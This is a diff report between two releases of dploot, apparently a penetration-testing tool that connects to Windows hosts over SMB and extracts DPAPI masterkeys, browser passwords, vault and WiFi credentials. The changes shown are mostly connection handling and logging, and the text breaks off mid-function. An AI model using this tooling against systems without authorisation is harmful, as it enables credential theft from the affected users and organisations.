# Comparing `tmp/dploot-2.1.9.tar.gz` & `tmp/dploot-2.2.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "dploot-2.1.9.tar", last modified: Mon Feb  6 13:52:42 2023, max compression
+gzip compressed data, was "dploot-2.2.0.tar", max compression
```

## Comparing `dploot-2.1.9.tar` & `dploot-2.2.0.tar`

### file list

```diff
@@ -1,50 +1,37 @@
-drwxrwxr-x   0 tse       (1000) tse       (1000)        0 2023-02-06 13:52:41.998914 dploot-2.1.9/
--rw-rw-r--   0 tse       (1000) tse       (1000)     1066 2023-02-06 11:11:26.000000 dploot-2.1.9/LICENSE
--rw-rw-r--   0 tse       (1000) tse       (1000)      317 2023-02-06 13:52:41.998914 dploot-2.1.9/PKG-INFO
--rwxrwxr-x   0 tse       (1000) tse       (1000)    29201 2023-02-06 11:11:26.000000 dploot-2.1.9/README.md
-drwxrwxr-x   0 tse       (1000) tse       (1000)        0 2023-02-06 13:52:41.990914 dploot-2.1.9/dploot/
--rw-rw-r--   0 tse       (1000) tse       (1000)        0 2023-02-06 11:11:26.000000 dploot-2.1.9/dploot/__init__.py
-drwxrwxr-x   0 tse       (1000) tse       (1000)        0 2023-02-06 13:52:41.994914 dploot-2.1.9/dploot/action/
--rw-rw-r--   0 tse       (1000) tse       (1000)        0 2023-02-06 11:11:26.000000 dploot-2.1.9/dploot/action/__init__.py
--rwxrwxr-x   0 tse       (1000) tse       (1000)     2959 2023-02-06 11:11:26.000000 dploot-2.1.9/dploot/action/backupkey.py
--rwxrwxr-x   0 tse       (1000) tse       (1000)     4439 2023-02-06 11:11:26.000000 dploot-2.1.9/dploot/action/browser.py
--rwxrwxr-x   0 tse       (1000) tse       (1000)     4558 2023-02-06 11:11:26.000000 dploot-2.1.9/dploot/action/certificates.py
--rwxrwxr-x   0 tse       (1000) tse       (1000)     3973 2023-02-06 11:11:26.000000 dploot-2.1.9/dploot/action/credentials.py
--rwxrwxr-x   0 tse       (1000) tse       (1000)     4276 2023-02-06 11:11:26.000000 dploot-2.1.9/dploot/action/machinecertificates.py
--rwxrwxr-x   0 tse       (1000) tse       (1000)     3719 2023-02-06 11:11:26.000000 dploot-2.1.9/dploot/action/machinecredentials.py
--rwxrwxr-x   0 tse       (1000) tse       (1000)     3369 2023-02-06 11:11:26.000000 dploot-2.1.9/dploot/action/machinemasterkeys.py
--rwxrwxr-x   0 tse       (1000) tse       (1000)     6095 2023-02-06 11:11:26.000000 dploot-2.1.9/dploot/action/machinetriage.py
--rwxrwxr-x   0 tse       (1000) tse       (1000)     3641 2023-02-06 11:11:26.000000 dploot-2.1.9/dploot/action/machinevaults.py
--rwxrwxr-x   0 tse       (1000) tse       (1000)     5370 2023-02-06 13:49:08.000000 dploot-2.1.9/dploot/action/masterkeys.py
--rwxrwxr-x   0 tse       (1000) tse       (1000)     4511 2023-02-06 11:11:26.000000 dploot-2.1.9/dploot/action/rdg.py
--rwxrwxr-x   0 tse       (1000) tse       (1000)     7843 2023-02-06 11:11:26.000000 dploot-2.1.9/dploot/action/triage.py
--rwxrwxr-x   0 tse       (1000) tse       (1000)     3873 2023-02-06 11:11:26.000000 dploot-2.1.9/dploot/action/vaults.py
--rwxrwxr-x   0 tse       (1000) tse       (1000)     3800 2023-02-06 11:11:26.000000 dploot-2.1.9/dploot/action/wifi.py
--rwxrwxr-x   0 tse       (1000) tse       (1000)     1818 2023-02-06 11:11:26.000000 dploot-2.1.9/dploot/entry.py
-drwxrwxr-x   0 tse       (1000) tse       (1000)        0 2023-02-06 13:52:41.998914 dploot-2.1.9/dploot/lib/
--rw-rw-r--   0 tse       (1000) tse       (1000)        0 2023-02-06 11:11:26.000000 dploot-2.1.9/dploot/lib/__init__.py
--rwxrwxr-x   0 tse       (1000) tse       (1000)    11877 2023-02-06 11:11:26.000000 dploot-2.1.9/dploot/lib/crypto.py
--rwxrwxr-x   0 tse       (1000) tse       (1000)    10464 2023-02-06 11:11:26.000000 dploot-2.1.9/dploot/lib/dpapi.py
--rwxrwxr-x   0 tse       (1000) tse       (1000)     6554 2023-02-06 11:11:26.000000 dploot-2.1.9/dploot/lib/smb.py
--rwxrwxr-x   0 tse       (1000) tse       (1000)     5823 2023-02-06 11:11:26.000000 dploot-2.1.9/dploot/lib/target.py
--rwxrwxr-x   0 tse       (1000) tse       (1000)     1870 2023-02-06 13:47:25.000000 dploot-2.1.9/dploot/lib/utils.py
--rw-rw-r--   0 tse       (1000) tse       (1000)     1909 2023-02-06 11:11:26.000000 dploot-2.1.9/dploot/lib/wmi.py
-drwxrwxr-x   0 tse       (1000) tse       (1000)        0 2023-02-06 13:52:41.998914 dploot-2.1.9/dploot/triage/
--rw-rw-r--   0 tse       (1000) tse       (1000)        0 2023-02-06 11:11:26.000000 dploot-2.1.9/dploot/triage/__init__.py
--rwxrwxr-x   0 tse       (1000) tse       (1000)     3068 2023-02-06 11:11:26.000000 dploot-2.1.9/dploot/triage/backupkey.py
--rwxrwxr-x   0 tse       (1000) tse       (1000)    10478 2023-02-06 11:11:26.000000 dploot-2.1.9/dploot/triage/browser.py
--rwxrwxr-x   0 tse       (1000) tse       (1000)    13447 2023-02-06 11:11:26.000000 dploot-2.1.9/dploot/triage/certificates.py
--rwxrwxr-x   0 tse       (1000) tse       (1000)     5912 2023-02-06 11:11:26.000000 dploot-2.1.9/dploot/triage/credentials.py
--rwxrwxr-x   0 tse       (1000) tse       (1000)     8580 2023-02-06 13:41:52.000000 dploot-2.1.9/dploot/triage/masterkeys.py
--rwxrwxr-x   0 tse       (1000) tse       (1000)     8935 2023-02-06 11:11:26.000000 dploot-2.1.9/dploot/triage/rdg.py
--rwxrwxr-x   0 tse       (1000) tse       (1000)     9102 2023-02-06 11:11:26.000000 dploot-2.1.9/dploot/triage/vaults.py
--rwxrwxr-x   0 tse       (1000) tse       (1000)     9875 2023-02-06 11:11:26.000000 dploot-2.1.9/dploot/triage/wifi.py
-drwxrwxr-x   0 tse       (1000) tse       (1000)        0 2023-02-06 13:52:41.990914 dploot-2.1.9/dploot.egg-info/
--rw-rw-r--   0 tse       (1000) tse       (1000)      317 2023-02-06 13:52:41.000000 dploot-2.1.9/dploot.egg-info/PKG-INFO
--rw-rw-r--   0 tse       (1000) tse       (1000)     1042 2023-02-06 13:52:41.000000 dploot-2.1.9/dploot.egg-info/SOURCES.txt
--rw-rw-r--   0 tse       (1000) tse       (1000)        1 2023-02-06 13:52:41.000000 dploot-2.1.9/dploot.egg-info/dependency_links.txt
--rw-rw-r--   0 tse       (1000) tse       (1000)       46 2023-02-06 13:52:41.000000 dploot-2.1.9/dploot.egg-info/entry_points.txt
--rw-rw-r--   0 tse       (1000) tse       (1000)       61 2023-02-06 13:52:41.000000 dploot-2.1.9/dploot.egg-info/requires.txt
--rw-rw-r--   0 tse       (1000) tse       (1000)        7 2023-02-06 13:52:41.000000 dploot-2.1.9/dploot.egg-info/top_level.txt
--rw-rw-r--   0 tse       (1000) tse       (1000)       38 2023-02-06 13:52:41.998914 dploot-2.1.9/setup.cfg
--rwxrwxr-x   0 tse       (1000) tse       (1000)      698 2023-02-06 13:51:22.000000 dploot-2.1.9/setup.py
+-rw-r--r--   0        0        0     1066 2023-06-13 10:00:55.333927 dploot-2.2.0/LICENSE
+-rwxr-xr-x   0        0        0    29201 2023-06-13 10:00:55.333927 dploot-2.2.0/README.md
+-rw-r--r--   0        0        0        0 2023-06-13 10:00:55.333927 dploot-2.2.0/dploot/__init__.py
+-rw-r--r--   0        0        0        0 2023-06-13 10:00:55.333927 dploot-2.2.0/dploot/action/__init__.py
+-rwxr-xr-x   0        0        0     3081 2023-06-13 10:00:55.333927 dploot-2.2.0/dploot/action/backupkey.py
+-rwxr-xr-x   0        0        0     4550 2023-06-13 10:00:55.333927 dploot-2.2.0/dploot/action/browser.py
+-rwxr-xr-x   0        0        0     4669 2023-06-13 10:00:55.333927 dploot-2.2.0/dploot/action/certificates.py
+-rwxr-xr-x   0        0        0     4084 2023-06-13 10:00:55.333927 dploot-2.2.0/dploot/action/credentials.py
+-rwxr-xr-x   0        0        0     4387 2023-06-13 10:00:55.333927 dploot-2.2.0/dploot/action/machinecertificates.py
+-rwxr-xr-x   0        0        0     3830 2023-06-13 10:00:55.333927 dploot-2.2.0/dploot/action/machinecredentials.py
+-rwxr-xr-x   0        0        0     3487 2023-06-13 10:00:55.333927 dploot-2.2.0/dploot/action/machinemasterkeys.py
+-rwxr-xr-x   0        0        0     6206 2023-06-13 10:00:55.333927 dploot-2.2.0/dploot/action/machinetriage.py
+-rwxr-xr-x   0        0        0     3752 2023-06-13 10:00:55.333927 dploot-2.2.0/dploot/action/machinevaults.py
+-rwxr-xr-x   0        0        0     5477 2023-06-13 10:00:55.333927 dploot-2.2.0/dploot/action/masterkeys.py
+-rwxr-xr-x   0        0        0     4622 2023-06-13 10:00:55.333927 dploot-2.2.0/dploot/action/rdg.py
+-rwxr-xr-x   0        0        0     7954 2023-06-13 10:00:55.333927 dploot-2.2.0/dploot/action/triage.py
+-rwxr-xr-x   0        0        0     3984 2023-06-13 10:00:55.333927 dploot-2.2.0/dploot/action/vaults.py
+-rwxr-xr-x   0        0        0     3911 2023-06-13 10:00:55.333927 dploot-2.2.0/dploot/action/wifi.py
+-rwxr-xr-x   0        0        0     1818 2023-06-13 10:00:55.337927 dploot-2.2.0/dploot/entry.py
+-rw-r--r--   0        0        0        0 2023-06-13 10:00:55.337927 dploot-2.2.0/dploot/lib/__init__.py
+-rwxr-xr-x   0        0        0    11877 2023-06-13 10:00:55.337927 dploot-2.2.0/dploot/lib/crypto.py
+-rwxr-xr-x   0        0        0    10464 2023-07-18 12:50:53.982513 dploot-2.2.0/dploot/lib/dpapi.py
+-rwxr-xr-x   0        0        0     9325 2023-07-19 09:37:36.379073 dploot-2.2.0/dploot/lib/smb.py
+-rwxr-xr-x   0        0        0     5594 2023-06-13 10:00:55.337927 dploot-2.2.0/dploot/lib/target.py
+-rwxr-xr-x   0        0        0     1870 2023-06-13 10:00:55.337927 dploot-2.2.0/dploot/lib/utils.py
+-rw-r--r--   0        0        0     1909 2023-06-13 10:00:55.337927 dploot-2.2.0/dploot/lib/wmi.py
+-rw-r--r--   0        0        0        0 2023-06-13 10:00:55.337927 dploot-2.2.0/dploot/triage/__init__.py
+-rwxr-xr-x   0        0        0     3068 2023-06-13 10:00:55.337927 dploot-2.2.0/dploot/triage/backupkey.py
+-rwxr-xr-x   0        0        0     9603 2023-06-13 10:00:55.337927 dploot-2.2.0/dploot/triage/browser.py
+-rwxr-xr-x   0        0        0    13228 2023-06-13 10:13:40.653925 dploot-2.2.0/dploot/triage/certificates.py
+-rwxr-xr-x   0        0        0     5912 2023-06-13 10:00:55.337927 dploot-2.2.0/dploot/triage/credentials.py
+-rwxr-xr-x   0        0        0     9288 2023-07-19 10:23:55.486944 dploot-2.2.0/dploot/triage/masterkeys.py
+-rwxr-xr-x   0        0        0     8935 2023-06-13 10:00:55.337927 dploot-2.2.0/dploot/triage/rdg.py
+-rwxr-xr-x   0        0        0     9218 2023-06-13 10:00:55.337927 dploot-2.2.0/dploot/triage/vaults.py
+-rwxr-xr-x   0        0        0     9430 2023-07-19 11:16:46.318796 dploot-2.2.0/dploot/triage/wifi.py
+-rw-r--r--   0        0        0      899 2023-07-19 11:17:16.618795 dploot-2.2.0/pyproject.toml
+-rw-r--r--   0        0        0    30151 1970-01-01 00:00:00.000000 dploot-2.2.0/PKG-INFO
```

### Comparing `dploot-2.1.9/LICENSE` & `dploot-2.2.0/LICENSE`

 * *Files identical despite different names*

### Comparing `dploot-2.1.9/README.md` & `dploot-2.2.0/README.md`

 * *Files identical despite different names*

### Comparing `dploot-2.1.9/dploot/action/backupkey.py` & `dploot-2.2.0/dploot/action/backupkey.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,11 @@
 import argparse
 import logging
 from binascii import hexlify
+import sys
 from typing import Callable, Tuple
 
 from dploot.lib.target import Target, add_target_argument_group
 from dploot.lib.smb import DPLootSMBConnection
 from dploot.triage.backupkey import BackupkeyTriage
 
 NAME = 'backupkey'
@@ -24,15 +25,17 @@
         if self.options.outputfile is not None and self.options.outputfile != '':
             self.outputfile = self.options.outputfile
         else:
             self.outputfile = 'key.pvk'
 
     def connect(self) -> None:
         self.conn = DPLootSMBConnection(self.target)
-        self.conn.connect()
+        if self.conn.connect() is None:
+            logging.error("Could not connect to %s" % self.target.address)
+            sys.exit(1)
 
     def run(self) -> None:
         self.connect()
         logging.info("Connected to %s as %s\\%s %s\n" % (self.target.address, self.target.domain, self.target.username, ( "(admin)"if self.is_admin  else "")))
         triage = BackupkeyTriage(target=self.target, conn=self.conn)
         backupkey = triage.triage_backupkey()
         if backupkey.backupkey_v1 is not None and self.legacy:
```

### Comparing `dploot-2.1.9/dploot/action/browser.py` & `dploot-2.2.0/dploot/action/browser.py`

 * *Files 2% similar despite different names*

```diff
@@ -36,15 +36,17 @@
                 logging.error(str(e))
                 sys.exit(1)
 
         self.pvkbytes, self.passwords, self.nthashes = parse_masterkeys_options(self.options, self.target)
 
     def connect(self) -> None:
         self.conn = DPLootSMBConnection(self.target)
-        self.conn.connect()
+        if self.conn.connect() is None:
+            logging.error("Could not connect to %s" % self.target.address)
+            sys.exit(1)
 
     def run(self) -> None:
         self.connect()
         logging.info("Connected to %s as %s\\%s %s\n" % (self.target.address, self.target.domain, self.target.username, ( "(admin)"if self.is_admin  else "")))
         if self.is_admin:
             if self.masterkeys is None:
                 masterkeytriage = MasterkeysTriage(target=self.target, conn=self.conn, pvkbytes=self.pvkbytes, nthashes=self.nthashes, passwords=self.passwords)
```

### Comparing `dploot-2.1.9/dploot/action/certificates.py` & `dploot-2.2.0/dploot/action/certificates.py`

 * *Files 1% similar despite different names*

```diff
@@ -36,15 +36,17 @@
                 logging.error(str(e))
                 sys.exit(1)
 
         self.pvkbytes, self.passwords, self.nthashes = parse_masterkeys_options(self.options, self.target)
 
     def connect(self) -> None:
         self.conn = DPLootSMBConnection(self.target)
-        self.conn.connect()
+        if self.conn.connect() is None:
+            logging.error("Could not connect to %s" % self.target.address)
+            sys.exit(1)
 
     def run(self) -> None:
         self.connect()
         logging.info("Connected to %s as %s\\%s %s\n" % (self.target.address, self.target.domain, self.target.username, ( "(admin)"if self.is_admin  else "")))
         if self.is_admin:
             if self.masterkeys is None:
                 masterkeytriage = MasterkeysTriage(target=self.target, conn=self.conn, pvkbytes=self.pvkbytes, nthashes=self.nthashes, passwords=self.passwords)
```

### Comparing `dploot-2.1.9/dploot/action/credentials.py` & `dploot-2.2.0/dploot/action/credentials.py`

 * *Files 4% similar despite different names*

```diff
@@ -36,15 +36,17 @@
                 logging.error(str(e))
                 sys.exit(1)
 
         self.pvkbytes, self.passwords, self.nthashes = parse_masterkeys_options(self.options, self.target)
 
     def connect(self) -> None:
         self.conn = DPLootSMBConnection(self.target)
-        self.conn.connect()
+        if self.conn.connect() is None:
+            logging.error("Could not connect to %s" % self.target.address)
+            sys.exit(1)
 
     def run(self) -> None:
         self.connect()
         logging.info("Connected to %s as %s\\%s %s\n" % (self.target.address, self.target.domain, self.target.username, ( "(admin)"if self.is_admin  else "")))
         if self.is_admin:
             if self.masterkeys is None:
                 masterkeytriage = MasterkeysTriage(target=self.target, conn=self.conn, pvkbytes=self.pvkbytes, nthashes=self.nthashes, passwords=self.passwords)
```

### Comparing `dploot-2.1.9/dploot/action/machinecertificates.py` & `dploot-2.2.0/dploot/action/machinecertificates.py`

 * *Files 2% similar despite different names*

```diff
@@ -32,15 +32,17 @@
                 self.masterkeys = parse_masterkey_file(self.options.mkfile)
             except Exception as e:
                 logging.error(str(e))
                 sys.exit(1)
 
     def connect(self) -> None:
         self.conn = DPLootSMBConnection(self.target)
-        self.conn.connect()
+        if self.conn.connect() is None:
+            logging.error("Could not connect to %s" % self.target.address)
+            sys.exit(1)
     
     def run(self) -> None:
         self.connect()
         logging.info("Connected to %s as %s\\%s %s\n" % (self.target.address, self.target.domain, self.target.username, ( "(admin)"if self.is_admin  else "")))
         if self.is_admin:
             if self.masterkeys is None:
                 triage = MasterkeysTriage(target=self.target, conn=self.conn)
```

### Comparing `dploot-2.1.9/dploot/action/machinecredentials.py` & `dploot-2.2.0/dploot/action/machinecredentials.py`

 * *Files 2% similar despite different names*

```diff
@@ -32,15 +32,17 @@
                 self.masterkeys = parse_masterkey_file(self.options.mkfile)
             except Exception as e:
                 logging.error(str(e))
                 sys.exit(1)
 
     def connect(self) -> None:
         self.conn = DPLootSMBConnection(self.target)
-        self.conn.connect()
+        if self.conn.connect() is None:
+            logging.error("Could not connect to %s" % self.target.address)
+            sys.exit(1)
     
     def run(self) -> None:
         self.connect()
         logging.info("Connected to %s as %s\\%s %s\n" % (self.target.address, self.target.domain, self.target.username, ( "(admin)"if self.is_admin  else "")))
         if self.is_admin:
             if self.masterkeys is None:
                 triage = MasterkeysTriage(target=self.target, conn=self.conn)
```

### Comparing `dploot-2.1.9/dploot/action/machinemasterkeys.py` & `dploot-2.2.0/dploot/action/machinemasterkeys.py`

 * *Files 4% similar despite different names*

```diff
@@ -1,10 +1,11 @@
 import argparse
 import logging
 import os
+import sys
 from typing import Callable, Tuple
 
 from dploot.lib.smb import DPLootSMBConnection
 from dploot.lib.target import Target, add_target_argument_group
 from dploot.lib.utils import handle_outputdir_option
 from dploot.triage.masterkeys import MasterkeysTriage
 
@@ -27,29 +28,31 @@
         self.outputdir = handle_outputdir_option(dir= self.options.export_mk)
 
         if self.options.outputfile is not None and self.options.outputfile != '':
             self.outputfile = self.options.outputfile
 
     def connect(self) -> None:
         self.conn = DPLootSMBConnection(self.target)
-        self.conn.connect()
+        if self.conn.connect() is None:
+            logging.error("Could not connect to %s" % self.target.address)
+            sys.exit(1)
     
     def run(self) -> None:
         self.connect()
         logging.info("Connected to %s as %s\\%s %s\n" % (self.target.address, self.target.domain, self.target.username, ( "(admin)"if self.is_admin  else "")))
         if self.is_admin:
             triage = MasterkeysTriage(target=self.target, conn=self.conn)
             logging.info("Triage SYSTEM masterkeys\n")
             masterkeys = triage.triage_system_masterkeys()
             if self.outputfile is not None:
                 with open(self.outputfile + '.mkf', ('a+' if self.append else 'w')) as file:
+                    logging.critical("Writting masterkeys to %s" % self.outputfile)
                     for masterkey in masterkeys:
                         masterkey.dump()
                         file.write(str(masterkey)+'\n')
-                        logging.critical("Writting masterkeys to %s" % self.outputfile)
             else:
                 for masterkey in masterkeys:
                     masterkey.dump()
             if self.outputdir is not None:
                 for filename, bytes in triage.looted_files.items():
                     with open(os.path.join(self.outputdir, filename),'wb') as outputfile:
                         outputfile.write(bytes)
```

### Comparing `dploot-2.1.9/dploot/action/machinetriage.py` & `dploot-2.2.0/dploot/action/machinetriage.py`

 * *Files 1% similar despite different names*

```diff
@@ -38,15 +38,17 @@
                 self.masterkeys = parse_masterkey_file(self.options.mkfile)
             except Exception as e:
                 logging.error(str(e))
                 sys.exit(1)
 
     def connect(self) -> None:
         self.conn = DPLootSMBConnection(self.target)
-        self.conn.connect()
+        if self.conn.connect() is None:
+            logging.error("Could not connect to %s" % self.target.address)
+            sys.exit(1)
 
     def run(self) -> None:
         self.connect()
         logging.info("Connected to %s as %s\\%s %s\n" % (self.target.address, self.target.domain, self.target.username, ( "(admin)"if self.is_admin  else "")))
         
         if self.is_admin:
             if self.masterkeys is None:
```

### Comparing `dploot-2.1.9/dploot/action/machinevaults.py` & `dploot-2.2.0/dploot/action/machinevaults.py`

 * *Files 2% similar despite different names*

```diff
@@ -33,15 +33,17 @@
                 self.masterkeys = parse_masterkey_file(self.options.mkfile)
             except Exception as e:
                 logging.error(str(e))
                 sys.exit(1)
 
     def connect(self) -> None:
         self.conn = DPLootSMBConnection(self.target)
-        self.conn.connect()
+        if self.conn.connect() is None:
+            logging.error("Could not connect to %s" % self.target.address)
+            sys.exit(1)
     
     def run(self) -> None:
         self.connect()
         logging.info("Connected to %s as %s\\%s %s\n" % (self.target.address, self.target.domain, self.target.username, ( "(admin)"if self.is_admin  else "")))
         if self.is_admin:
             if self.masterkeys is None:
                 triage = MasterkeysTriage(target=self.target, conn=self.conn)
```

### Comparing `dploot-2.1.9/dploot/action/masterkeys.py` & `dploot-2.2.0/dploot/action/masterkeys.py`

 * *Files 2% similar despite different names*

```diff
@@ -32,29 +32,31 @@
         if self.options.outputfile is not None and self.options.outputfile != '':
             self.outputfile = self.options.outputfile
 
         self.pvkbytes, self.passwords, self.nthashes = parse_masterkeys_options(self.options, self.target)
 
     def connect(self) -> None:
         self.conn = DPLootSMBConnection(self.target)
-        self.conn.connect()
+        if self.conn.connect() is None:
+            logging.error("Could not connect to %s" % self.target.address)
+            sys.exit(1)
     
     def run(self) -> None:
         self.connect()
         logging.info("Connected to %s as %s\\%s %s\n" % (self.target.address, self.target.domain, self.target.username, ( "(admin)"if self.is_admin  else "")))
         if self.is_admin:
             triage = MasterkeysTriage(target=self.target, conn=self.conn, pvkbytes=self.pvkbytes, nthashes=self.nthashes, passwords=self.passwords)
             logging.info("Triage ALL USERS masterkeys\n")
             masterkeys = triage.triage_masterkeys()
             if self.outputfile is not None:
                 with open(self.outputfile + '.mkf', 'a+')as file:
+                    logging.critical("Writting masterkeys to %s" % self.outputfile)
                     for masterkey in masterkeys:
                         masterkey.dump()
                         file.write(str(masterkey)+'\n')
-                        logging.critical("Writting masterkeys to %s" % self.outputfile)
             else:
                 for masterkey in masterkeys:
                     masterkey.dump()
             if self.outputdir is not None:
                 for filename, bytes in triage.looted_files.items():
                     with open(os.path.join(self.outputdir, filename),'wb') as outputfile:
                         outputfile.write(bytes)
```

### Comparing `dploot-2.1.9/dploot/action/rdg.py` & `dploot-2.2.0/dploot/action/rdg.py`

 * *Files 3% similar despite different names*

```diff
@@ -35,15 +35,17 @@
                 logging.error(str(e))
                 sys.exit(1)
 
         self.pvkbytes, self.passwords, self.nthashes = parse_masterkeys_options(self.options, self.target)
 
     def connect(self) -> None:
         self.conn = DPLootSMBConnection(self.target)
-        self.conn.connect()
+        if self.conn.connect() is None:
+            logging.error("Could not connect to %s" % self.target.address)
+            sys.exit(1)
 
     def run(self) -> None:
         self.connect()
         logging.info("Connected to %s as %s\\%s %s\n" % (self.target.address, self.target.domain, self.target.username, ( "(admin)"if self.is_admin  else "")))
         if self.is_admin:
             if self.masterkeys is None:
                 masterkeytriage = MasterkeysTriage(target=self.target, conn=self.conn, pvkbytes=self.pvkbytes, nthashes=self.nthashes, passwords=self.passwords)
```

### Comparing `dploot-2.1.9/dploot/action/triage.py` & `dploot-2.2.0/dploot/action/triage.py`

 * *Files 1% similar despite different names*

```diff
@@ -43,15 +43,17 @@
                 logging.error(str(e))
                 sys.exit(1)
 
         self.pvkbytes, self.passwords, self.nthashes = parse_masterkeys_options(self.options, self.target)
 
     def connect(self) -> None:
         self.conn = DPLootSMBConnection(self.target)
-        self.conn.connect()
+        if self.conn.connect() is None:
+            logging.error("Could not connect to %s" % self.target.address)
+            sys.exit(1)
 
     def run(self) -> None:
         self.connect()
         logging.info("Connected to %s as %s\\%s %s\n" % (self.target.address, self.target.domain, self.target.username, ( "(admin)"if self.is_admin  else "")))
         
         if self.is_admin:
             if self.masterkeys is None:
```

### Comparing `dploot-2.1.9/dploot/action/vaults.py` & `dploot-2.2.0/dploot/action/vaults.py`

 * *Files 3% similar despite different names*

```diff
@@ -36,15 +36,17 @@
                 logging.error(str(e))
                 sys.exit(1)
 
         self.pvkbytes, self.passwords, self.nthashes = parse_masterkeys_options(self.options, self.target)
 
     def connect(self) -> None:
         self.conn = DPLootSMBConnection(self.target)
-        self.conn.connect()
+        if self.conn.connect() is None:
+            logging.error("Could not connect to %s" % self.target.address)
+            sys.exit(1)
 
     def run(self) -> None:
         self.connect()
         logging.info("Connected to %s as %s\\%s %s\n" % (self.target.address, self.target.domain, self.target.username, ( "(admin)"if self.is_admin  else "")))
         if self.is_admin:
             if self.masterkeys is None:
                 masterkeytriage = MasterkeysTriage(target=self.target, conn=self.conn, pvkbytes=self.pvkbytes, nthashes=self.nthashes, passwords=self.passwords)
```

### Comparing `dploot-2.1.9/dploot/action/wifi.py` & `dploot-2.2.0/dploot/action/wifi.py`

 * *Files 3% similar despite different names*

```diff
@@ -36,15 +36,17 @@
                 self.masterkeys = parse_masterkey_file(self.options.mkfile)
             except Exception as e:
                 logging.error(str(e))
                 sys.exit(1)
 
     def connect(self) -> None:
         self.conn = DPLootSMBConnection(self.target)
-        self.conn.connect()
+        if self.conn.connect() is None:
+            logging.error("Could not connect to %s" % self.target.address)
+            sys.exit(1)
     
     def run(self) -> None:
         self.connect()
         logging.info("Connected to %s as %s\\%s %s\n" % (self.target.address, self.target.domain, self.target.username, ( "(admin)"if self.is_admin  else "")))
         if self.is_admin:
             if self.masterkeys is None:
                 triage = MasterkeysTriage(target=self.target, conn=self.conn)
```

### Comparing `dploot-2.1.9/dploot/entry.py` & `dploot-2.2.0/dploot/entry.py`

 * *Files identical despite different names*

### Comparing `dploot-2.1.9/dploot/lib/crypto.py` & `dploot-2.2.0/dploot/lib/crypto.py`

 * *Files identical despite different names*

### Comparing `dploot-2.1.9/dploot/lib/dpapi.py` & `dploot-2.2.0/dploot/lib/dpapi.py`

 * *Files identical despite different names*

### Comparing `dploot-2.1.9/dploot/lib/smb.py` & `dploot-2.2.0/dploot/lib/smb.py`

 * *Files 24% similar despite different names*

```diff
@@ -1,58 +1,116 @@
+import socket
 import sys
 import ntpath
 import logging
 import time
 from typing import Any, Dict, List
 
 from dploot.lib.target import Target
 
 from impacket.smbconnection import SMBConnection
+from impacket.smb import SMB_DIALECT
+from impacket.nmb import NetBIOSTimeout
 from impacket.examples.secretsdump import RemoteOperations
 from impacket.smb3structs import FILE_READ_DATA, FILE_OPEN, FILE_NON_DIRECTORY_FILE, FILE_SHARE_READ
 
 from dploot.lib.wmi import DPLootWmiExec
 
 class DPLootSMBConnection:
     def __init__(self, target: Target) -> None:
         self.target = target
 
         self.smb_session = None
         self.remote_ops = None
+        self.smbv1 = False
 
-    def connect(self) -> None:
+    def create_smbv1_conn(self, kdc=''):
+        try:
+            self.smb_session = SMBConnection(self.target.address if not kdc else kdc, self.target.address if not kdc else kdc, None, preferredDialect=SMB_DIALECT)
+            self.smbv1 = True
+        except socket.error as e:
+            if str(e).find('Connection reset by peer') != -1:
+                logging.debug('SMBv1 might be disabled on {}'.format(self.target.address if not kdc else kdc))
+            return False
+        except (Exception, NetBIOSTimeout) as e:
+            logging.debug('Error creating SMBv1 connection to {}: {}'.format(self.target.address if not kdc else kdc, e))
+            return False
+
+        return True
+
+    def create_smbv3_conn(self, kdc=''):
+        try:
+            self.smb_session = SMBConnection(self.target.address if not kdc else kdc, self.target.address if not kdc else kdc, None)
+            self.smbv1 = False
+        except socket.error as e:
+            if str(e).find('Too many open files') != -1:
+                logging.error('SMBv3 connection error on {}: {}'.format(self.target.address if not kdc else kdc, e))
+            return False
+        except (Exception, NetBIOSTimeout) as e:
+            logging.debug('Error creating SMBv3 connection to {}: {}'.format(self.target.address if not kdc else kdc, e))
+            return False
+
+        return True
+
+    def create_conn_obj(self, kdc=''):
+        if self.create_smbv3_conn(kdc):
+            return True
+        elif self.create_smbv1_conn(kdc):
+            return True
+        logging.debug("Could not create connection object to %s" % (self.target.address if not kdc else kdc))
+        return False
+
+    def connect(self) -> "Any | None":
         try:
-            self.smb_session = SMBConnection(self.target.address,self.target.address)
             if self.target.do_kerberos:
+                # getting hostname
+                no_ntlm = False
+                if not self.create_conn_obj():
+                    return None
+                try:
+                    self.smb_session.login('' , '')
+                except Exception as e:
+                    if "STATUS_NOT_SUPPORTED" in str(e):
+                        no_ntlm = True
+                    pass
+                hostname = self.smb_session.getServerName() if not no_ntlm else self.target.address
+                self.smb_session.close()
+                self.target.address = hostname + "." + self.target.domain
+                logging.debug("Connecting to %s" % self.target.address)
+                if not self.create_conn_obj(self.target.address):
+                    return None
                 logging.debug("Authenticating with %s through Kerberos" % self.target.username)
                 self.smb_session.kerberosLogin(
                     user=self.target.username,
                     password=self.target.password,
                     domain=self.target.domain,
                     lmhash=self.target.lmhash,
                     nthash=self.target.nthash,
                     aesKey=self.target.aesKey,
                     kdcHost=self.target.kdcHost,
                     useCache=self.target.use_kcache,
                     )
             else:
+                logging.debug("Connecting to %s" % self.target.address)
+                if not self.create_conn_obj():
+                    return None
                 logging.debug("Authenticating with %s through NTLM" % self.target.username)
                 self.smb_session.login(
                     user=self.target.username,
                     password=self.target.password,
                     domain=self.target.domain,
                     lmhash=self.target.lmhash,
                     nthash=self.target.nthash
                     )
         except Exception as e:
             if logging.getLogger().level == logging.DEBUG:
                 import traceback
                 traceback.print_exc()
                 logging.debug(str(e))
-            sys.exit(1)
+            return None
         return self.smb_session
 
     def remote_list_dir(self, share, path, wildcard=True) -> "Any | None":
         if wildcard:
             path = ntpath.join(path, '*')
         try:
             return self.smb_session.listPath(shareName=share, path=ntpath.normpath(path))
@@ -110,38 +168,42 @@
 
         data = None
 
         try:
             fileId = self.smb_session.openFile(treeId, path, FILE_READ_DATA, shareAccessMode, FILE_NON_DIRECTORY_FILE, mode, 0)
             fileInfo = self.smb_session.queryInfo(treeId, fileId)
             fileSize = fileInfo['EndOfFile']
-            if (fileSize-offset) < self.smb_session._SMBConnection._Connection['MaxReadSize']:
+            res = self.smb_session._SMBConnection.getIOCapabilities()
+            if (fileSize-offset) < res['MaxReadSize']:
                 # Skip reading 0 bytes files.
                 if (fileSize-offset) > 0:
                     data = self.smb_session._SMBConnection.read(treeId, fileId, offset, fileSize-offset)
             else:
                 written = 0
                 toBeRead = fileSize-offset
+                data = b''
                 while written < toBeRead:
